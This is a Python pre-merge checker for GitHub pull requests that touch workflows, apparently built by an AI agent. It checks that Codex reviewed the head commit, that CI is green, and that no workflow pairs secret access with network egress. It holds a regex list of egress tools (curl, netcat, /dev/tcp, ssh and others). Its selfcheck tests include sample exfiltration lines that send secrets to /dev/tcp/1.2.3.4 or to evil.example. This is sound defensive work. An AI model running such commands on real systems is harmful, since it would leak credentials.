#!/usr/bin/env python3
"""r30_merge_check.py — R30 workflow-PR pre-merge verification (advisory).

================================ PROVENANCE ================================
Why added : Playbook R30 / docs/workflow-pr-merge-policy.md (owner live
            2026-07-19, landed PR #367) puts a safety-critical, multi-step
            checklist on the merge-side agent for every
            `.github/workflows/**`-touching PR. The idea to mechanize it was
            recorded on the PR #368 session card (💡 Session idea): "one
            stdlib script ... printing PASS/STOP per point with the evidence
            lines — the agent still decides, the script just makes the
            checklist undroppable and its evidence quotable in the merge
            record." This script is that checker. It merges NOTHING; it
            verifies and reports.
Date      : 2026-07-19 (build-slice worker, model: fable-5, dispatched by
            the fleet-manager coordinator seat; fleet-manager PR #372)
Reliability: unverified — confirm its output against ground truth a few
            times across sessions before trusting it.
            Ground-truth run 1 (2026-07-19, PR #372): retro-verification of
            fleet-manager #344 (merged workflow-touching PR, roster cron) —
            verbatim output on the session card.
Kill-switch: delete this if it proves unreliable over multiple sessions.
=============================================================================

WHAT IT DOES — the R30 3-point pre-merge check, bound to the EXACT head SHA
(policy: docs/workflow-pr-merge-policy.md; playbook R30). Run it BEFORE
merging a workflow-touching PR; quote its output in the merge record.

  Point 1 — Codex reviewed THAT commit. Finds the Codex review artifacts
    (reviews + inline review comments by a `*codex*` login, the
    `chatgpt-codex-connector[bot]` shape verified on fm #362) whose
    commit_id is the current head SHA. Requires: at least one head-bound
    Codex review; none of them `CHANGES_REQUESTED`; zero P1/P2 findings in
    BOTH the inline comments and the review summary bodies (badge shapes
    `![P1 Badge](...)` / `img.shields.io/badge/P1-` plus bracketed/bolded
    variants). Codex evidence absent, or present only for a stale commit,
    is REVIEW — never PASS (fail-safe in direction, per policy).
  Point 2 — every check on the head is green: check runs (completed with
    conclusion success/neutral/skipped) AND legacy commit statuses
    (combined state success, or none exist). Zero CI evidence of either
    kind is REVIEW, not PASS.
  Point 3 — the RESULTING head workflows don't pair secret/env access with
    outbound egress. Whole-file scan at the head SHA (never added-lines
    only): secret indicators (`${{ secrets.* }}`, GITHUB_TOKEN, `${{ env.*
    }}`) vs egress indicators (curl/wget/nc/ncat/netcat, /dev/tcp|udp,
    interpreter one-liners python/node/perl/ruby/php -c/-e/-r,
    Invoke-WebRequest/RestMethod, ssh/scp/sftp, openssl s_client).
    Verdicts: a secret indicator ON an egress line, or egress whose target
    is not a known GitHub host (or is indiscernible — /dev/tcp, variable
    URLs) in a file that also accesses secrets → STOP. Secrets + egress
    both present but every egress target is a known GitHub API host →
    REVIEW (evidence printed; the pairing judgment the policy demands stays
    with the agent — never a false green). A workflow file whose diff entry
    has no `patch` (oversized/truncated), or a files list the API cannot
    fully enumerate, → STOP (policy: ambiguous diffs route to the owner
    queue, do not merge).

VERDICT / EXIT CONTRACT (advisory tier — NEVER merge-blocking, not wired
into `bootstrap.py check`; the agent still decides):
  PASS   exit 0 — all three points hold at the head SHA.
  REVIEW exit 2 — a point is unproven or remediable (stale/absent Codex,
                  non-green or absent CI, GitHub-scoped secret+egress
                  pairing, an unmeasured point-1/2 API read).
  STOP   exit 1 — policy-STOP evidence (secret+egress pairing off-GitHub,
                  same-line secret+egress, patch-less/oversized diff,
                  unreadable head workflow content): route to the owner
                  queue, do not merge.
  Final verdict = worst point (STOP > REVIEW > PASS).

API ACCESS (same class as check_label_hygiene.py / check_owner_queue.py):
plain REST via urllib, stdlib only; two-rung transport per request — direct
egress first (the CAPABILITIES direct-PAT path), then the default proxied
opener once. Bearer token from $GITHUB_PAT or $GITHUB_TOKEN when set. An
API wall on point 1/2 degrades that point to REVIEW with the verbatim
error; a wall on point 3 (diff/content reads) is STOP — an unreadable
workflow diff is exactly the policy's "ambiguous" case. Merged/closed PRs
verify gracefully (retro-verification): the head SHA, its checks, and its
content are all still addressable.

USAGE
  python3 scripts/r30_merge_check.py --repo menno420/fleet-manager --pr 344
  python3 scripts/r30_merge_check.py --selfcheck   # offline fixture pins

No third-party deps: stdlib only. Fixtures: scripts/fixtures/r30/*.yml.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import re
import sys
import urllib.error
import urllib.request

POLICY = "docs/workflow-pr-merge-policy.md (playbook R30)"
API = "https://api.github.com"

PASS, REVIEW, STOP = "PASS", "REVIEW", "STOP"
SEVERITY = {PASS: 0, REVIEW: 1, STOP: 2}
EXIT_CODE = {PASS: 0, REVIEW: 2, STOP: 1}

CODEX_LOGIN_RE = re.compile(r"codex", re.IGNORECASE)

# P1/P2 finding shapes — ground-truthed on fm #362 (verbatim inline comment:
# "**<sub><sub>![P1 Badge](https://img.shields.io/badge/P1-orange?style=flat)
# </sub></sub>  Remove stale clearance ...**"). Badge forms first, then
# conservative bracketed/bolded variants; bare "P1"/"P2" words are NOT
# matched (prose false-positives), but a fabricated finding only ever blocks
# a merge — fail-safe in direction, per policy.
P12_RE = re.compile(
    r"!\[P[12]\s+Badge\]"
    r"|img\.shields\.io/badge/P[12]-"
    r"|[\[(]P[12][\])]"
    r"|\*\*P[12]\*\*"
)

SECRET_RES = [
    (re.compile(r"\$\{\{\s*secrets\."), "`${{ secrets.* }}`"),
    (re.compile(r"\bGITHUB_TOKEN\b"), "GITHUB_TOKEN"),
    (re.compile(r"\$\{\{\s*env\."), "`${{ env.* }}`"),
]
EGRESS_RES = [
    (re.compile(r"\bcurl\b"), "curl"),
    (re.compile(r"\bwget\b"), "wget"),
    (re.compile(r"\b(?:nc|ncat|netcat)\b"), "nc/ncat/netcat"),
    (re.compile(r"/dev/(?:tcp|udp)/"), "/dev/tcp|udp"),
    (re.compile(r"\bpython[0-9.]*\s+-c\b"), "python -c one-liner"),
    (re.compile(r"\bnode\s+(?:-e|--eval)\b"), "node -e one-liner"),
    (re.compile(r"\bperl\s+-[eE]\b"), "perl -e one-liner"),
    (re.compile(r"\bruby\s+-e\b"), "ruby -e one-liner"),
    (re.compile(r"\bphp\s+-r\b"), "php -r one-liner"),
    (re.compile(r"\bInvoke-(?:WebRequest|RestMethod)\b|\biwr\b"),
     "PowerShell web request"),
    (re.compile(r"\b(?:ssh|scp|sftp)\b"), "ssh/scp/sftp"),
    (re.compile(r"\bopenssl\s+s_client\b"), "openssl s_client"),
]
GITHUB_HOSTS = {
    "api.github.com", "github.com", "www.github.com",
    "raw.githubusercontent.com", "objects.githubusercontent.com",
    "uploads.github.com", "codeload.github.com",
}
URL_RE = re.compile(r"https?://([A-Za-z0-9._-]+)")
# Max PR files we will enumerate before declaring the diff un-enumerable.
MAX_FILES_PAGES = 4  # 4 × 100

# ------------------------------------------------------------ transport ----

_DIRECT = urllib.request.build_opener(urllib.request.ProxyHandler({}))
_PROXIED = urllib.request.build_opener()


def api_get(path: str, token: str | None) -> tuple[object | None, str | None]:
    """(json, None) on success, (None, verbatim wall) on failure.

    Two rungs, each attempted once: direct egress, then the default proxied
    opener. The wall string quotes BOTH failures verbatim — nothing invented.
    """
    req = urllib.request.Request(API + path, headers={
        "Accept": "application/vnd.github+json",
        "User-Agent": "fleet-manager-r30-merge-check",
        **({"Authorization": f"Bearer {token}"} if token else {}),
    })
    walls = []
    for tag, opener in (("direct", _DIRECT), ("proxied", _PROXIED)):
        try:
            with opener.open(req, timeout=30) as resp:
                return json.loads(resp.read().decode()), None
        except urllib.error.HTTPError as exc:
            walls.append(f"{tag}: HTTP {exc.code} {exc.reason}")
        except (urllib.error.URLError, OSError, json.JSONDecodeError) as exc:
            walls.append(f"{tag}: {exc}")
    return None, "; ".join(walls)


def api_get_paged(path: str, token: str | None, max_pages: int
                  ) -> tuple[list | None, str | None, bool]:
    """Paginate a list endpoint. Returns (items, wall, exhausted_cap)."""
    sep = "&" if "?" in path else "?"
    items: list = []
    for page in range(1, max_pages + 1):
        data, wall = api_get(f"{path}{sep}per_page=100&page={page}", token)
        if wall is not None:
            return None, wall, False
        assert isinstance(data, list)
        items.extend(data)
        if len(data) < 100:
            return items, None, False
    return items, None, True  # cap hit — list may be incomplete


# ------------------------------------------------------ point 3 (scan) -----

def scan_workflow_text(path: str, text: str) -> dict:
    """Whole-file secret+egress pairing scan for ONE head workflow file.

    Returns {"verdict": PASS|REVIEW|STOP, "evidence": [lines...]}. Pure —
    selfcheck-pinned. Never a false green: any secret+egress co-presence is
    at least REVIEW; off-GitHub / indiscernible / same-line pairing is STOP.
    """
    secret_hits: list[tuple[int, str, str]] = []
    egress_hits: list[tuple[int, str, str]] = []
    # Merge shell backslash-continuations into logical lines (keyed to the
    # first physical line number) so a `curl ... \` + next-line URL is
    # analyzed as ONE egress statement — otherwise its target looks
    # indiscernible and every continuation-style workflow would STOP.
    logical: list[tuple[int, str]] = []
    for lineno, line in enumerate(text.splitlines(), 1):
        if logical and logical[-1][1].rstrip().endswith("\\"):
            start, prev = logical[-1]
            logical[-1] = (start, prev.rstrip()[:-1] + " " + line.strip())
        else:
            logical.append((lineno, line))
    for lineno, line in logical:
        for rex, label in SECRET_RES:
            if rex.search(line):
                secret_hits.append((lineno, label, line.strip()[:100]))
        for rex, label in EGRESS_RES:
            if rex.search(line):
                egress_hits.append((lineno, label, line.strip()[:100]))
    ev = [f"{path}: {len(secret_hits)} secret/env-access line(s), "
          f"{len(egress_hits)} egress line(s) [whole file scanned, "
          f"{len(text.splitlines())} lines]"]
    for lineno, label, frag in secret_hits[:10]:
        ev.append(f"  secret L{lineno} ({label}): {frag}")
    for lineno, label, frag in egress_hits[:10]:
        ev.append(f"  egress L{lineno} ({label}): {frag}")
    if not secret_hits or not egress_hits:
        ev.append(f"  -> no secret+egress PAIRING in {path}")
        return {"verdict": PASS, "evidence": ev}
    # Both present — classify each egress line.
    verdict = REVIEW
    secret_lines = {ln for ln, _, _ in secret_hits}
    for lineno, label, frag in egress_hits:
        hosts = URL_RE.findall(frag)
        if lineno in secret_lines:
            ev.append(f"  STOP-evidence: secret indicator ON egress line "
                      f"L{lineno} ({label})")
            verdict = STOP
        elif not hosts or any(h.lower() not in GITHUB_HOSTS for h in hosts):
            tgt = ", ".join(hosts) if hosts else "indiscernible target"
            ev.append(f"  STOP-evidence: egress L{lineno} ({label}) to "
                      f"non-GitHub/{tgt} in a secret-accessing file")
            verdict = STOP
    if verdict == REVIEW:
        ev.append(f"  -> secrets + egress co-present but every egress "
                  f"target is a known GitHub host — pairing judgment stays "
                  f"with the agent (policy demands judgment; never a false "
                  f"green)")
    return {"verdict": verdict, "evidence": ev}


def worst(verdicts: list[str]) -> str:
    return max(verdicts, key=lambda v: SEVERITY[v]) if verdicts else PASS


# ------------------------------------------------------------- points ------

def check_point1(owner: str, repo: str, pr: int, head: str,
                 token: str | None) -> dict:
    base = f"/repos/{owner}/{repo}/pulls/{pr}"
    reviews, wall, _ = api_get_paged(f"{base}/reviews", token, 3)
    if wall is not None:
        return {"verdict": REVIEW,
                "evidence": [f"reviews NOT MEASURED (wall: {wall}) — "
                             f"re-run; unproven is never PASS"]}
    comments, wall, _ = api_get_paged(f"{base}/comments", token, 3)
    if wall is not None:
        return {"verdict": REVIEW,
                "evidence": [f"review comments NOT MEASURED (wall: {wall})"]}
    cx_reviews = [r for r in reviews
                  if CODEX_LOGIN_RE.search((r.get("user") or {})
                                           .get("login", ""))]
    cx_comments = [c for c in comments
                   if CODEX_LOGIN_RE.search((c.get("user") or {})
                                            .get("login", ""))]
    ev = [f"head SHA: {head}",
          f"Codex reviews found: {len(cx_reviews)} "
          f"(of {len(reviews)} total); Codex inline comments: "
          f"{len(cx_comments)}"]
    head_reviews = [r for r in cx_reviews if r.get("commit_id") == head]
    head_comments = [c for c in cx_comments
                     if head in (c.get("commit_id"),
                                 c.get("original_commit_id"))]
    for r in cx_reviews:
        ev.append(f"  review by {r['user']['login']}: state={r['state']} "
                  f"commit={str(r.get('commit_id'))[:10]}"
                  f"{' <- HEAD' if r.get('commit_id') == head else ' (stale)'}")
    if not head_reviews:
        ev.append("-> NO Codex review bound to the head SHA (absent or "
                  "stale) — policy §1: Codex must review the exact SHA "
                  "about to merge")
        return {"verdict": REVIEW, "evidence": ev}
    if any(r.get("state") == "CHANGES_REQUESTED" for r in head_reviews):
        ev.append("-> head-bound Codex review is CHANGES_REQUESTED "
                  "(policy §1)")
        return {"verdict": REVIEW, "evidence": ev}
    findings = 0
    for r in head_reviews:            # summary bodies
        if P12_RE.search(r.get("body") or ""):
            findings += 1
            ev.append(f"  P1/P2 in head review SUMMARY "
                      f"({str(r.get('commit_id'))[:10]})")
    for c in head_comments:           # inline comments
        if P12_RE.search(c.get("body") or ""):
            findings += 1
            ev.append(f"  P1/P2 in head INLINE comment "
                      f"(path {c.get('path')}, id {c.get('id')})")
    stale_p12 = sum(1 for c in cx_comments if c not in head_comments
                    and P12_RE.search(c.get("body") or ""))
    if stale_p12:
        ev.append(f"  note: {stale_p12} P1/P2 finding(s) on EARLIER commits "
                  f"(verdict is head-bound; Codex re-raises live findings "
                  f"on re-review)")
    if findings:
        ev.append(f"-> {findings} P1/P2 finding(s) at the head — policy §1 "
                  f"requires zero (inline AND summary)")
        return {"verdict": REVIEW, "evidence": ev}
    ev.append(f"-> Codex reviewed the head SHA ({len(head_reviews)} "
              f"review(s)), not CHANGES_REQUESTED, zero P1/P2 in summary + "
              f"inline")
    return {"verdict": PASS, "evidence": ev}


def check_point2(owner: str, repo: str, head: str, token: str | None) -> dict:
    base = f"/repos/{owner}/{repo}/commits/{head}"
    runs_data, wall = api_get(f"{base}/check-runs?per_page=100", token)
    if wall is not None:
        return {"verdict": REVIEW,
                "evidence": [f"check runs NOT MEASURED (wall: {wall})"]}
    status_data, wall = api_get(f"{base}/status", token)
    if wall is not None:
        return {"verdict": REVIEW,
                "evidence": [f"commit status NOT MEASURED (wall: {wall})"]}
    runs = runs_data.get("check_runs", [])
    statuses = status_data.get("statuses", [])
    combined = status_data.get("state")
    ev = [f"check runs on head: {len(runs)}; legacy commit statuses: "
          f"{len(statuses)} (combined state: {combined})"]
    bad = 0
    for r in runs:
        ok = (r.get("status") == "completed"
              and r.get("conclusion") in ("success", "neutral", "skipped"))
        ev.append(f"  check run `{r.get('name')}`: {r.get('status')}/"
                  f"{r.get('conclusion')}{'' if ok else '  <- NOT GREEN'}")
        bad += 0 if ok else 1
    for s in statuses:
        ev.append(f"  status `{s.get('context')}`: {s.get('state')}"
                  f"{'' if s.get('state') == 'success' else '  <- NOT GREEN'}")
    if not runs and not statuses:
        ev.append("-> ZERO CI evidence at the head (no check runs, no "
                  "statuses) — unproven green is never PASS")
        return {"verdict": REVIEW, "evidence": ev}
    if bad or (statuses and combined != "success"):
        ev.append("-> not every check on the head is green (policy §2)")
        return {"verdict": REVIEW, "evidence": ev}
    ev.append("-> every check run + commit status on the head is green")
    return {"verdict": PASS, "evidence": ev}


def check_point3(owner: str, repo: str, pr: int, head: str,
                 token: str | None) -> dict:
    files, wall, cap = api_get_paged(
        f"/repos/{owner}/{repo}/pulls/{pr}/files", token, MAX_FILES_PAGES)
    if wall is not None:
        return {"verdict": STOP,
                "evidence": [f"PR files NOT MEASURED (wall: {wall}) — an "
                             f"unreadable diff is the policy's ambiguous "
                             f"case: STOP, route to the owner queue"]}
    if cap:
        return {"verdict": STOP,
                "evidence": [f"diff OVERSIZED: > {MAX_FILES_PAGES * 100} "
                             f"files — un-enumerable diff is a STOP "
                             f"(policy §3)"]}
    wf = [f for f in files
          if f.get("filename", "").startswith(".github/workflows/")]
    ev = [f"PR files: {len(files)}; workflow-touching: {len(wf)} "
          f"({', '.join(f['filename'] for f in wf) or 'none'})"]
    if not wf:
        ev.append("-> PR does not touch .github/workflows/** — R30's §3 "
                  "scan has no subject (points 1–2 still reported)")
        return {"verdict": PASS, "evidence": ev}
    verdicts = []
    for f in wf:
        name, status = f["filename"], f.get("status")
        if status == "removed":
            ev.append(f"{name}: removed at head — nothing to scan")
            verdicts.append(PASS)
            continue
        if "patch" not in f:
            ev.append(f"{name}: files API returned NO `patch` "
                      f"(oversized/truncated diff) — STOP (policy §3 names "
                      f"this exact case)")
            verdicts.append(STOP)
            continue
        blob, wall = api_get(
            f"/repos/{owner}/{repo}/contents/"
            f"{urllib.request.quote(name)}?ref={head}", token)
        if wall is not None:
            ev.append(f"{name}: head content NOT READABLE (wall: {wall}) — "
                      f"whole-file scan impossible — STOP")
            verdicts.append(STOP)
            continue
        try:
            text = base64.b64decode(blob.get("content", "")).decode(
                "utf-8", "replace")
        except Exception as exc:  # noqa: BLE001 — verbatim, fail-safe
            ev.append(f"{name}: content decode failed ({exc}) — STOP")
            verdicts.append(STOP)
            continue
        res = scan_workflow_text(name, text)
        ev.extend(res["evidence"])
        verdicts.append(res["verdict"])
    v = worst(verdicts)
    ev.append(f"-> whole-file head scan verdict: {v}")
    return {"verdict": v, "evidence": ev}


# -------------------------------------------------------------- report -----

def render(owner: str, repo: str, pr: int, meta: dict,
           p1: dict, p2: dict, p3: dict) -> tuple[str, str]:
    final = worst([p1["verdict"], p2["verdict"], p3["verdict"]])
    lines = [f"# R30 pre-merge verification — {owner}/{repo} PR #{pr}",
             f"head: {meta['head']} · PR state: {meta['state']}"
             f"{' (MERGED — retro-verification)' if meta['merged'] else ''}",
             f"policy: {POLICY}", ""]
    for title, res in (
            ("Point 1 — Codex reviewed the exact head SHA (policy §1)", p1),
            ("Point 2 — every check on the head is green (policy §2)", p2),
            ("Point 3 — head workflows: no secret+egress pairing "
             "(policy §3)", p3)):
        lines.append(f"## {title}")
        lines.extend(f"  {e}" for e in res["evidence"])
        lines.append(f"  VERDICT: {res['verdict']}")
        lines.append("")
    cite = {
        PASS: "all three policy conditions verified at the head SHA — the "
              "merge-side agent may merge (the agent still decides; this "
              "checker merges nothing)",
        REVIEW: "a policy condition is unproven or unmet — do NOT merge "
                "yet; get Codex on the head / green CI / re-run, then "
                "re-verify",
        STOP: "policy STOP — do not merge; route to the owner queue "
              "(policy §3: anything ambiguous, and any secret+egress "
              "pairing, is a STOP)",
    }[final]
    lines.append(f"FINAL: {final} (exit {EXIT_CODE[final]}) — {cite}")
    return "\n".join(lines), final


# ----------------------------------------------------------- selfcheck -----

FIXTURES = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "fixtures", "r30")

# Verbatim Codex artifact shapes, ground-truthed on fm #362 (2026-07-19).
CODEX_SUMMARY_362 = ("### 💡 Codex Review\n\nHere are some automated review "
                     "suggestions for this pull request.\n\n**Reviewed "
                     "commit:** `0fd49c5292`")
CODEX_P1_INLINE_362 = ("**<sub><sub>![P1 Badge](https://img.shields.io/badge/"
                       "P1-orange?style=flat)</sub></sub>  Remove stale "
                       "clearance when the file lookup fails**")


def selfcheck() -> int:
    """Offline pins of the pure logic (no network)."""
    # P1/P2 detection — the real fm #362 badge shape + variants, and
    # non-findings that must NOT match.
    assert P12_RE.search(CODEX_P1_INLINE_362)
    assert P12_RE.search("![P2 Badge](https://img.shields.io/badge/P2-x)")
    assert P12_RE.search("[P1] leaked token") and P12_RE.search("**P2** risk")
    assert not P12_RE.search(CODEX_SUMMARY_362)      # clean summary
    assert not P12_RE.search("phase P2 of the plan p1 = x; P100; APP1E")
    # workflow scan fixtures — one per verdict
    cases = {"clean.yml": PASS, "github-scoped.yml": REVIEW,
             "exfil.yml": STOP}
    for fname, want in cases.items():
        with open(os.path.join(FIXTURES, fname), encoding="utf-8") as fh:
            got = scan_workflow_text(fname, fh.read())["verdict"]
        assert got == want, f"{fname}: want {want}, got {got}"
    # same-line secret+egress and /dev/tcp indiscernible-target → STOP
    s = scan_workflow_text("x.yml",
                           "run: curl -d \"${{ secrets.T }}\" https://api."
                           "github.com/x")
    assert s["verdict"] == STOP
    s = scan_workflow_text(
        "x.yml", "env:\n  T: ${{ secrets.T }}\nrun: cat /etc/e > "
                 "/dev/tcp/1.2.3.4/443")
    assert s["verdict"] == STOP
    # no pairing: egress alone / secrets alone → PASS (policy bans PAIRING)
    assert scan_workflow_text("x.yml", "run: curl https://evil.example"
                              )["verdict"] == PASS
    assert scan_workflow_text("x.yml", "env:\n  T: ${{ secrets.T }}"
                              )["verdict"] == PASS
    # aggregation + exit contract
    assert worst([PASS, PASS, PASS]) == PASS and EXIT_CODE[PASS] == 0
    assert worst([PASS, REVIEW, PASS]) == REVIEW and EXIT_CODE[REVIEW] == 2
    assert worst([REVIEW, STOP, PASS]) == STOP and EXIT_CODE[STOP] == 1
    # patch-less workflow entry logic (unit shape: the files-API dict)
    entry = {"filename": ".github/workflows/w.yml", "status": "modified"}
    assert "patch" not in entry  # the exact condition check_point3 STOPs on
    print("selfcheck OK (Codex-shape pins from fm #362 + 3 verdict "
          "fixtures + pairing/exit contract)")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--repo", help="owner/name, e.g. menno420/fleet-manager")
    ap.add_argument("--pr", type=int, help="pull request number")
    ap.add_argument("--selfcheck", action="store_true")
    args = ap.parse_args(argv)
    if args.selfcheck:
        return selfcheck()
    if not args.repo or not args.pr or "/" not in (args.repo or ""):
        ap.error("--repo owner/name and --pr N are required (or --selfcheck)")
    owner, repo = args.repo.split("/", 1)
    token = os.environ.get("GITHUB_PAT") or os.environ.get("GITHUB_TOKEN")
    prd, wall = api_get(f"/repos/{owner}/{repo}/pulls/{args.pr}", token)
    if wall is not None:
        print(f"FATAL: cannot read PR {args.repo}#{args.pr} (wall: {wall})")
        return EXIT_CODE[STOP]
    meta = {"head": prd["head"]["sha"], "state": prd["state"],
            "merged": bool(prd.get("merged"))}
    p1 = check_point1(owner, repo, args.pr, meta["head"], token)
    p2 = check_point2(owner, repo, meta["head"], token)
    p3 = check_point3(owner, repo, args.pr, meta["head"], token)
    text, final = render(owner, repo, args.pr, meta, p1, p2, p3)
    print(text)
    return EXIT_CODE[final]


if __name__ == "__main__":
    sys.exit(main())
